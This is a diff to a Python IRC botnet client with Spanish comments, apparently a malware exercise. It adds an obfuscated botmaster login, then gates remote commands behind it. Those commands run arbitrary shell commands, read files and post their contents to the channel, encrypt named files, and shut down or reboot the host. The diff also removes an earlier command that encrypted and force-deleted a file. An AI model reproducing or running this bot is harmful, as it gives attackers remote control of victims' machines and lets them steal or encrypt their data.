@@ -9,6 +9,8 @@ canal = "#canal"
 nickName = ""
 puerto = 6667
 
+isAuth = False
+
 
 def Cifra(key, fnamec):
       """
@@ -67,46 +69,108 @@ def get_msg(canal, ircmsg):
             mensaje = mensaje[1].replace(":", "",1)
       return mensaje
 
-      
+def isBotMaster(passwd):
+    '''
+        Funcion ofuscada para identificar al usuario.
+        compara que el login sea la concatenacion de 'Scana' con el valor de canal
+        caracter por caracter empezando con 'Scana'. Tomando solo los primeros 10 caracteres
+        ejemplo:
+            si canal = '#canal'
+            el valor de login debe ser
+            S#ccaannaa
+    '''
+    #usamos la variable global
+    global canal
+    flag = False
+    #La longitud debe ser de 10 caracteres
+    if (len(passwd) + 21)**2 != 961:
+        return False
+
+    #Comparamos caracter a caracter
+    for x in range(10):
+        #Caracteres que deben ser iguales a 'Scana'
+        if x % 2 == 0:
+            if x == 0 and passwd[x] == 'S':
+                flag = True
+            elif x == 2 and passwd[x] == 'c':
+                flag = True
+            elif x == 4 and passwd[x] == 'a':
+                flag = True
+            elif x == 6 and passwd[x] == 'n':
+                flag = True
+            elif x == 8 and passwd[x] == 'a':
+                flag = True
+            else:
+                flag = False
+        #Caracteres que deben ser igual al valor de canal
+        else:
+            if passwd[x] == canal[x/2]:
+                flag = True
+            else:
+                flag = False
+
+        if not flag:
+            return False
+            
+    return True 
 
 def do_command(irc, ircmsg):
-      if ircmsg.find("Hola") != -1:
-            send_msg(irc, canal, "Hola!!!")
+    '''
+        Funcion que implementa todos los comandos disponibles para el Bot
+        Cuando no se esta autenticado, solo se permiten el comando para
+        PING-PONG y el comando de login
+    '''
+    global isAuth
 
-      elif ircmsg.find("!@exec") != -1:
+    #Comando permitidos sin autenticacion
+    if not isAuth:
+        if ircmsg.find("Hola") != -1:
+                send_msg(irc, canal, "Hola!!!")
+
+        elif ircmsg.find("!@login") != -1:
+                command_rec = ircmsg.split("!@login ")[1]
+                isAuth = isBotMaster(command_rec)
+                if isAuth:
+                    send_msg(irc, canal, "Bienvenido!")
+
+    #comando permitidos con autenticacion
+    else:
+        if ircmsg.find("!@exec") != -1:
             command_rec = ircmsg.split("!@exec ")[1]
             command_rec = command_rec.split(" ")
             command_rec.append("&")
             sub_stdout, sub_stderr = Popen(command_rec, stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             #send_msg(irc, canal, sub_stdout.replace("\r\n", ", "))
             send_msg(irc, canal, "Hecho!")
-      
-      elif ircmsg.find("!@cat") != -1:
+        
+        elif ircmsg.find("!@ls") != -1:
+            sub_stdout, sub_stderr = Popen(["ls"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
+            send_msg(irc, canal, sub_stdout.replace("\r\n", ", "))
+                
+        elif ircmsg.find("!@cat") != -1:
             command_rec = ircmsg.split("!@cat ")[1]
             sub_stdout, sub_stderr = Popen(["cat", command_rec], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             send_msg(irc, canal, sub_stdout)
-            
-      elif ircmsg.find("!@cifra") != -1:
-		  send_msg(irc, canal, "Cifrando...")
-		  llave = CreaLlave('hola')
-		  Cifra(llave,"C:\\Users\\malware\\Desktop\\algo.txt")
-		  os.system("del /F /Q /A C:\\Users\\malware\\Desktop\\algo.txt")
-		  send_msg(irc, canal, "Cifrado exitoso.")
 
-      elif ircmsg.find("!@pwd") != -1:
+        elif ircmsg.find("!@pwd") != -1:
             sub_stdout, sub_stderr = Popen(["pwd"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             send_msg(irc, canal, sub_stdout.replace("\r\n", ""))
 
-      elif ircmsg.find("!@bye") != -1:
+        elif ircmsg.find("!@cifraArchivo") != -1:
+            command_rec = ircmsg.split("!@cifraArchivo ")[1]
+            cifraArchivo(CreaLlave('a.txt'), command_rec)
+
+        
+        elif ircmsg.find("!@bye") != -1:
             send_msg(irc, canal, "Me voy a dormir zZ")
             #sub_stdout, sub_stderr = Popen(["taskkill", "/IM", "BotIRCMreboo.exe", "/F"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             sub_stdout, sub_stderr = Popen(["taskkill", "/IM", "notepad.exe", "/F"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
-      
-      elif ircmsg.find("!@shutdown") != -1:
+        
+        elif ircmsg.find("!@shutdown") != -1:
             send_msg(irc, canal, "Adios ;)")
             sub_stdout, sub_stderr = Popen(["shutdown", "/s", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
 
-      elif ircmsg.find("!@reboot") != -1 :
+        elif ircmsg.find("!@reboot") != -1 :
             send_msg(irc, "Regreso en un minuto, voy al banio :O")
             sub_stdout, sub_stderr = Popen(["shutdown", "/r", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
       
